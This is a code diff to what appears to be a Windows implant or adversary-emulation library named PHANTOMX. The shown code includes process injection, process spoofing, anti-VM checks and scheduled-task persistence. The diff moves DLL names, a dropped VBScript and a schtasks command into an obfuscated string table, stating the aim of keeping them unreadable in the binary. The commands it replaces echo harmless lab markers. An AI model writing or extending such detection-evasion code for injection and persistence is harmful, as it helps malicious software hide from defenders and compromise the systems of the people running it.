@@ -67,6 +67,48 @@
 #include <tlhelp32.h>
 
 /* ------------------------------------------------------------------ */
+/* Strings from the encoded table                                      */
+/* ------------------------------------------------------------------ */
+/*                                                                       */
+/* The capability library used raw literals for the DLL names and the    */
+/* command lines, which left them readable in the binary even in the    */
+/* obfuscated arms: "ntdll.dll", "advapi32.dll" and "cmd /c " were    */
+/* all sitting in the image in the clear.                               */
+/*                                                                       */
+/* The string table already had entries for some of them -- they were   */
+/* simply not being used. These helpers decode an entry once and hand   */
+/* back the plain text, so the literals never reach the disk.          */
+/* ------------------------------------------------------------------ */
+static const char *px_cap_table_str(unsigned int sid, char *buf,
+                                    unsigned int cap)
+{
+    if (!buf[0])
+        px_obf_decode(sid, buf, cap);
+    return buf;
+}
+
+/* The ntdll module name. */
+static const char *px_cap_ntdll(void)
+{
+    static char buf[16];
+    return px_cap_table_str(PX_SID_NTDLL, buf, sizeof(buf));
+}
+
+/* The VBScript the script-host capability drops. */
+static const char *px_cap_vbscript(void)
+{
+    static char buf[160];
+    return px_cap_table_str(PX_SID_VBSCRIPT_BODY, buf, sizeof(buf));
+}
+
+/* The scheduled task the persistence capability creates. */
+static const char *px_cap_schtasks(void)
+{
+    static char buf[192];
+    return px_cap_table_str(PX_SID_SCHTASKS_CREATE, buf, sizeof(buf));
+}
+
+/* ------------------------------------------------------------------ */
 /* The capability table                                                */
 /* ------------------------------------------------------------------ */
 
@@ -211,7 +253,7 @@ static int px_cap_inject(char *args, char *report, unsigned int cap)
         void *shellcode = NULL;
         LPTHREAD_START_ROUTINE stub;
         FARPROC p_queue_user_apc = NULL;
-        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+        HMODULE ntdll = GetModuleHandleA(px_cap_ntdll());
 
         shellcode = VirtualAllocEx(h, NULL, 4096,
                                    MEM_COMMIT | MEM_RESERVE,
@@ -1007,8 +1049,7 @@ static int px_cap_script(char *args, char *report, unsigned int cap)
     {
         HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                 FILE_ATTRIBUTE_NORMAL, NULL);
-        const char *body = "var s = new ActiveXObject(\"WScript.Shell\");\r\n"
-                            "s.Run(\"cmd /c echo PHANTOMX_SCRIPT_HOST\");\r\n";
+        const char *body = px_cap_vbscript();
         DWORD written = 0;
         if (f != INVALID_HANDLE_VALUE) {
             WriteFile(f, body, (DWORD)strlen(body), &written, NULL);
@@ -1178,7 +1219,7 @@ static int px_cap_spoof(char *args, char *report, unsigned int cap)
 {
     char method[16];
     char *sp = px_strchr(args, ' ');
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    HMODULE ntdll = GetModuleHandleA(px_cap_ntdll());
 
     if (!sp)
         return -1;
@@ -1322,7 +1363,7 @@ static int px_cap_spoof(char *args, char *report, unsigned int cap)
                     void *peb;   /* ProcessEnvironmentBlock */
                 } px_teb;
                 typedef void *(NTAPI *fn_current_teb)(void);
-                HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+                HMODULE ntdll = GetModuleHandleA(px_cap_ntdll());
                 fn_current_teb cur = ntdll
                     ? (fn_current_teb)(void *)GetProcAddress(ntdll,
                                                            "NtCurrentTeb")
@@ -1478,7 +1519,7 @@ static int px_cap_antivm(char *args, char *report, unsigned int cap)
         {
             typedef LONG (WINAPI *fn_ntquery)(HANDLE, ULONG, PVOID, ULONG, PULONG);
             fn_ntquery q = NULL;
-            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+            HMODULE ntdll = GetModuleHandleA(px_cap_ntdll());
             if (ntdll)
                 q = (fn_ntquery)(void *)GetProcAddress(ntdll,
                                                         "NtQueryInformationProcess");
@@ -1772,9 +1813,7 @@ static int px_cap_schtask(char *args, char *report, unsigned int cap)
     char *out = NULL;
     long rc = -1;
 
-    px_snprintf(cmd, sizeof(cmd),
-                "schtasks /create /tn PXLabTask /tr \"cmd /c echo "
-                "PHANTOMX_SCHTASK\" /sc once /st 23:59 /f");
+    px_strcpy(cmd, px_cap_schtasks(), sizeof(cmd));
     out = px_run_capture(cmd, NULL, 0, &rc);
     if (out)
         HeapFree(GetProcessHeap(), 0, out);
